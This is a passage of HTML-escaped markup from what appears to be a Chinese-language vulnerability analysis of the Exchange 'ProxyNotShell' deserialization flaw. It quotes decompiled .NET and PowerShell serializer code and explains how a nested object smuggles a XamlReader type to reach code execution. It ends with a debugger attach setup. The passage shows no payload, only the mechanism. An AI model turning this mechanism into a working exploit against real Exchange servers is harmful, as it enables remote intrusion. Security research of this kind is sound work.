&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-csharp" data-lang="csharp">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">internal&lt;/span> &lt;span style="color:#66d9ef">static&lt;/span> &lt;span style="color:#66d9ef">object&lt;/span> ConvertTo(&lt;span style="color:#66d9ef">object&lt;/span> valueToConvert, Type resultType, &lt;span style="color:#66d9ef">bool&lt;/span> recursion, IFormatProvider formatProvider, TypeTable backupTypeTable)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">object&lt;/span> result;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">using&lt;/span> (LanguagePrimitives.typeConversion.TraceScope(&lt;span style="color:#e6db74">&amp;#34;Converting \&amp;#34;{0}\&amp;#34; to \&amp;#34;{1}\&amp;#34;.&amp;#34;&lt;/span>, valueToConvert, resultType))
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (resultType == &lt;span style="color:#66d9ef">null&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">throw&lt;/span> PSTraceSource.NewArgumentNullException(&lt;span style="color:#e6db74">&amp;#34;resultType&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">bool&lt;/span> flag;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> result = LanguagePrimitives.FigureConversion(valueToConvert, resultType, &lt;span style="color:#66d9ef">out&lt;/span> flag).Invoke(flag ? PSObject.Base(valueToConvert) : valueToConvert, resultType, recursion, flag ? ((PSObject)valueToConvert) : &lt;span style="color:#66d9ef">null&lt;/span>, formatProvider, backupTypeTable);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> result;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>其定义了*&lt;code>&amp;lt;TypeName&amp;gt;Microsoft.Exchange.Data.SerializationTypeConverter&amp;lt;/TypeName&amp;gt;&lt;/code>&lt;em>，Exchange将通过&lt;/em>&lt;code>Microsoft.Exchange.Data.SerializationTypeConverter&lt;/code>*类对里层序列化数据进行反序列化。&lt;code>Microsoft.Exchange.Data.SerializationTypeConverter&lt;/code>经过一系列调用，最终由&lt;code>System.Runtime.Serialization.Formatters.Binary.ObjectReader.Deserialize&lt;/code>方法进行反序列化。&lt;/p>
&lt;p>在该方法会调用&lt;code>System.Runtime.Serialization.Formatters.Binary.__BinaryParser.Run&lt;/code>，这方法会循环读取内存中的里层对象的序列化数据，将其转换为&lt;em>System.UnitySerializationHolder&lt;/em>对象。&lt;/p>
&lt;p>之后Exchange会通过&lt;code>Assembly.LoadFrom&lt;/code>载入*&lt;code>System.UnitySerializationHolder.m_assemblyName&lt;/code>&lt;em>所指明的DLL，并且返回&lt;/em>&lt;code>System.UnitySerializationHolder.m_data&lt;/code>*类型的Type对象。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-csharp" data-lang="csharp">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">internal&lt;/span> &lt;span style="color:#66d9ef">object&lt;/span> Deserialize(HeaderHandler handler, __BinaryParser serParser, &lt;span style="color:#66d9ef">bool&lt;/span> fCheck, &lt;span style="color:#66d9ef">bool&lt;/span> isCrossAppDomain, IMethodCallMessage methodCallMessage)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ......
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> serParser.Run();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ......
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (!&lt;span style="color:#66d9ef">this&lt;/span>.bMethodCall &amp;amp;&amp;amp; !&lt;span style="color:#66d9ef">this&lt;/span>.bMethodReturn)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#66d9ef">this&lt;/span>.TopObject == &lt;span style="color:#66d9ef">null&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">throw&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> SerializationException(Environment.GetResourceString(&lt;span style="color:#e6db74">&amp;#34;Serialization_TopObject&amp;#34;&lt;/span>));
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#66d9ef">this&lt;/span>.HasSurrogate(&lt;span style="color:#66d9ef">this&lt;/span>.TopObject.GetType()) &amp;amp;&amp;amp; &lt;span style="color:#66d9ef">this&lt;/span>.topId != &lt;span style="color:#ae81ff">0L&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">this&lt;/span>.TopObject = &lt;span style="color:#66d9ef">this&lt;/span>.m_objectManager.GetObject(&lt;span style="color:#66d9ef">this&lt;/span>.topId);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#66d9ef">this&lt;/span>.TopObject &lt;span style="color:#66d9ef">is&lt;/span> IObjectReference)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">this&lt;/span>.TopObject = ((IObjectReference)&lt;span style="color:#66d9ef">this&lt;/span>.TopObject).GetRealObject(&lt;span style="color:#66d9ef">this&lt;/span>.m_context);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#66d9ef">this&lt;/span>.bFullDeserialization)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">this&lt;/span>.m_objectManager.RaiseDeserializationEvent();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (handler != &lt;span style="color:#66d9ef">null&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">this&lt;/span>.handlerObject = handler(&lt;span style="color:#66d9ef">this&lt;/span>.headers);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#66d9ef">this&lt;/span>.bMethodCall)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">object&lt;/span>[] callA = &lt;span style="color:#66d9ef">this&lt;/span>.TopObject &lt;span style="color:#66d9ef">as&lt;/span> &lt;span style="color:#66d9ef">object&lt;/span>[];
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">this&lt;/span>.TopObject = &lt;span style="color:#66d9ef">this&lt;/span>.binaryMethodCall.ReadArray(callA, &lt;span style="color:#66d9ef">this&lt;/span>.handlerObject);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">else&lt;/span> &lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#66d9ef">this&lt;/span>.bMethodReturn)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">object&lt;/span>[] returnA = &lt;span style="color:#66d9ef">this&lt;/span>.TopObject &lt;span style="color:#66d9ef">as&lt;/span> &lt;span style="color:#66d9ef">object&lt;/span>[];
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">this&lt;/span>.TopObject = &lt;span style="color:#66d9ef">this&lt;/span>.binaryMethodReturn.ReadArray(returnA, methodCallMessage, &lt;span style="color:#66d9ef">this&lt;/span>.handlerObject);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#66d9ef">this&lt;/span>.TopObject;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>
&lt;img alt="Untitled" src="https://www.ch35tnut.site/images/vulnerability/proxy-not-shell.zh-cn.assets/1.png" />&lt;/p>
&lt;p>
&lt;img alt="Untitled" src="https://www.ch35tnut.site/images/vulnerability/proxy-not-shell.zh-cn.assets/2.png" />&lt;/p>
&lt;p>在一系列函数调用返回后，&lt;em>&lt;code>System.Management.Automation.InternalDeserializer.ReadProperties&lt;/code>&lt;em>会将&lt;/em>&lt;code>System.Runtime.Serialization.Formatters.Binary.ObjectReader.Deserialize&lt;/code>&lt;em>返回的对象添加到&lt;/em>&lt;code>PSObject.adaptedMembers&lt;/code>&lt;em>中，需要注意的是该对象变量名为&lt;/em>&lt;code>TargetTypeForDeserialization&lt;/code>&lt;/em>。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-csharp" data-lang="csharp">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">private&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> ReadProperties(PSObject dso)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> dso.isDeserialized = &lt;span style="color:#66d9ef">true&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> dso.adaptedMembers = &lt;span style="color:#66d9ef">new&lt;/span> PSMemberInfoInternalCollection&amp;lt;PSPropertyInfo&amp;gt;();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> dso.InstanceMembers.Add(PSObject.dotNetInstanceAdapter.GetDotNetMethod&amp;lt;PSMemberInfo&amp;gt;(dso, &lt;span style="color:#e6db74">&amp;#34;GetType&amp;#34;&lt;/span>));
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> PSGetMemberBinder.SetHasInstanceMember(&lt;span style="color:#e6db74">&amp;#34;GetType&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> dso.clrMembers = &lt;span style="color:#66d9ef">new&lt;/span> PSMemberInfoInternalCollection&amp;lt;PSPropertyInfo&amp;gt;();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#66d9ef">this&lt;/span>.ReadStartElementAndHandleEmpty(&lt;span style="color:#e6db74">&amp;#34;Props&amp;#34;&lt;/span>))
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">while&lt;/span> (&lt;span style="color:#66d9ef">this&lt;/span>._reader.NodeType == XmlNodeType.Element)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">string&lt;/span> name = &lt;span style="color:#66d9ef">this&lt;/span>.ReadNameAttribute();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">object&lt;/span> serializedValue = &lt;span style="color:#66d9ef">this&lt;/span>.ReadOneObject();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> PSProperty member = &lt;span style="color:#66d9ef">new&lt;/span> PSProperty(name, serializedValue);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> dso.adaptedMembers.Add(member);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">this&lt;/span>.ReadEndElement();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>在反序列化外层对象时，&lt;code>ReadOneObject&lt;/code>会调用&lt;code>GetTargetTypeForDeserialization&lt;/code>获取反序列化的目标类型，并通过&lt;code>ConvertTo&lt;/code>转化为该对象。&lt;/p>
&lt;p>在&lt;code>GetTargetTypeForDeserialization&lt;/code>函数中，将会调用&lt;code>GetPSStandardMember&lt;/code>并传入硬编码的&lt;code>TargetTypeForDeserialization&lt;/code>，在&lt;code>GetPSStandardMember&lt;/code>中会通过&lt;code>TypeTableGetMemberDelegate&lt;/code>创建成员集合，其中包括子类的成员属性，而后匹配其中的&lt;code>memberName&lt;/code>项对应的值并返回。此时获取的值为&lt;code>XamlReader&lt;/code>类型的Type对象。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-csharp" data-lang="csharp">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">internal&lt;/span> Type GetTargetTypeForDeserialization(TypeTable backupTypeTable)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> PSMemberInfo psstandardMember = &lt;span style="color:#66d9ef">this&lt;/span>.GetPSStandardMember(backupTypeTable, &lt;span style="color:#e6db74">&amp;#34;TargetTypeForDeserialization&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (psstandardMember != &lt;span style="color:#66d9ef">null&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> psstandardMember.Value &lt;span style="color:#66d9ef">as&lt;/span> Type;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#66d9ef">null&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">internal&lt;/span> PSMemberInfo GetPSStandardMember(TypeTable backupTypeTable, &lt;span style="color:#66d9ef">string&lt;/span> memberName)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> PSMemberInfo psmemberInfo = &lt;span style="color:#66d9ef">null&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> TypeTable typeTable = (backupTypeTable != &lt;span style="color:#66d9ef">null&lt;/span>) ? backupTypeTable : &lt;span style="color:#66d9ef">this&lt;/span>.GetTypeTable();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (typeTable != &lt;span style="color:#66d9ef">null&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> PSMemberSet psmemberSet = PSObject.TypeTableGetMemberDelegate&amp;lt;PSMemberSet&amp;gt;(&lt;span style="color:#66d9ef">this&lt;/span>, typeTable, &lt;span style="color:#e6db74">&amp;#34;PSStandardMembers&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (psmemberSet != &lt;span style="color:#66d9ef">null&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> psmemberSet.ReplicateInstance(&lt;span style="color:#66d9ef">this&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> psmemberInfo = &lt;span style="color:#66d9ef">new&lt;/span> PSMemberInfoIntegratingCollection&amp;lt;PSMemberInfo&amp;gt;(psmemberSet, PSObject.GetMemberCollection(PSMemberViewTypes.All, backupTypeTable))[memberName];
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (psmemberInfo == &lt;span style="color:#66d9ef">null&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> psmemberInfo = (&lt;span style="color:#66d9ef">this&lt;/span>.InstanceMembers[&lt;span style="color:#e6db74">&amp;#34;PSStandardMembers&amp;#34;&lt;/span>] &lt;span style="color:#66d9ef">as&lt;/span> PSMemberSet);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> psmemberInfo;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>外层类类型定义为&lt;code>System.ServiceProcess.ServiceController&lt;/code>，其定义在types.ps1xml文件内，定义如下。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-xml" data-lang="xml">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;Type&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;Name&amp;gt;&lt;/span>System.ServiceProcess.ServiceController&lt;span style="color:#f92672">&amp;lt;/Name&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;Members&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;MemberSet&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;Name&amp;gt;&lt;/span>PSStandardMembers&lt;span style="color:#f92672">&amp;lt;/Name&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;Members&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;PropertySet&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;Name&amp;gt;&lt;/span>DefaultDisplayPropertySet&lt;span style="color:#f92672">&amp;lt;/Name&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;ReferencedProperties&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;Name&amp;gt;&lt;/span>Status&lt;span style="color:#f92672">&amp;lt;/Name&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;Name&amp;gt;&lt;/span>Name&lt;span style="color:#f92672">&amp;lt;/Name&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;Name&amp;gt;&lt;/span>DisplayName&lt;span style="color:#f92672">&amp;lt;/Name&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;/ReferencedProperties&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;/PropertySet&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;/Members&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;/MemberSet&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;AliasProperty&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;Name&amp;gt;&lt;/span>Name&lt;span style="color:#f92672">&amp;lt;/Name&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;ReferencedMemberName&amp;gt;&lt;/span>ServiceName&lt;span style="color:#f92672">&amp;lt;/ReferencedMemberName&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;/AliasProperty&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;AliasProperty&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;Name&amp;gt;&lt;/span>RequiredServices&lt;span style="color:#f92672">&amp;lt;/Name&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;ReferencedMemberName&amp;gt;&lt;/span>ServicesDependedOn&lt;span style="color:#f92672">&amp;lt;/ReferencedMemberName&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;/AliasProperty&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;ScriptMethod&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;Name&amp;gt;&lt;/span>ToString&lt;span style="color:#f92672">&amp;lt;/Name&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;Script&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $this.ServiceName
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;/Script&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;/ScriptMethod&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;/Members&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;/Type&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>在&lt;code>GetPSStandardMember&lt;/code>函数会试图获取System.ServiceProcess.ServiceController类的&lt;code>TargetTypeForDeserialization&lt;/code>（传入的硬编码参数）属性，但其在文件内没有定义默认的&lt;code>TargetTypeForDeserialization&lt;/code>值，所以外层类的&lt;code>members&lt;/code>内没有&lt;code>TargetTypeForDeserialization&lt;/code>名字的值，Exchange将试图从子类的&lt;code>members&lt;/code>属性中检索&lt;code>TargetTypeForDeserialization&lt;/code>名字的值，前面说过在对内层对象反序列化时，通过&lt;code>ReadProperties&lt;/code>将名为&lt;code>TargetTypeForDeserialization&lt;/code>的&lt;code>XamlReader&lt;/code>类型的Type对象添加到了&lt;code>adaptedMembers&lt;/code>中，此时&lt;code>Exchange&lt;/code>将会检索到该对象并返回。&lt;/p>
&lt;p>获取到&lt;code>targetTypeForDeserialization&lt;/code>之后，&lt;code>ReadOneObject&lt;/code>调用&lt;code>LanguagePrimitives.ConvertTo&lt;/code>将序列化数据转换为&lt;code>targetTypeForDeserialization(XamlReader)&lt;/code>。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-csharp" data-lang="csharp">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">internal&lt;/span> &lt;span style="color:#66d9ef">object&lt;/span> ReadOneObject(&lt;span style="color:#66d9ef">out&lt;/span> &lt;span style="color:#66d9ef">string&lt;/span> streamName)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ....
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">object&lt;/span> obj = &lt;span style="color:#66d9ef">this&lt;/span>.ReadOneDeserializedObject(&lt;span style="color:#66d9ef">out&lt;/span> streamName, &lt;span style="color:#66d9ef">out&lt;/span> flag);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> .....
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Type targetTypeForDeserialization = psobject.GetTargetTypeForDeserialization(&lt;span style="color:#66d9ef">this&lt;/span>._typeTable);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>....
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">object&lt;/span> obj2 = LanguagePrimitives.ConvertTo(obj, targetTypeForDeserialization, &lt;span style="color:#66d9ef">true&lt;/span>, CultureInfo.InvariantCulture, &lt;span style="color:#66d9ef">this&lt;/span>._typeTable);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> .....
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>ConvertTo函数会进行如下调用链，通过反射获取到XamlReader类的Parse方法后，将其调用，成功执行代码。&lt;/p>
&lt;p>
&lt;img alt="Untitled" src="https://www.ch35tnut.site/images/vulnerability/proxy-not-shell.zh-cn.assets/3.png" />&lt;/p>
&lt;h3 id="调试">调试&lt;/h3>
&lt;p>使用dnsPy附加到下面的进程&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-powershell" data-lang="powershell">&lt;span style="display:flex;">&lt;span>c:\windows\system32\inetsrv\w3wp.exe -ap
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74">&amp;#34;MSExchangePowerShellAppPool&amp;#34;&lt;/span> -v &lt;span style="color:#e6db74">&amp;#34;v4.0&amp;#34;&lt;/span> -c
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74">&amp;#34;C:\Program Files\Microsoft\Exchange Server\V15\bin\GenericAppPoolConfigWithGCServerEnabledFalse.config&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>-a \\.\pipe\iisipm319caf0c-5de0-&lt;span style="color:#ae81ff">4833&lt;/span>-8a04-4b28f4a836ae
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>-h &lt;span style="color:#e6db74">&amp;#34;C:\inetpub\temp\apppools\MSExchangePowerShellAppPool\MSExchangePowerShellAppPool.config&amp;#34;&lt;/span>
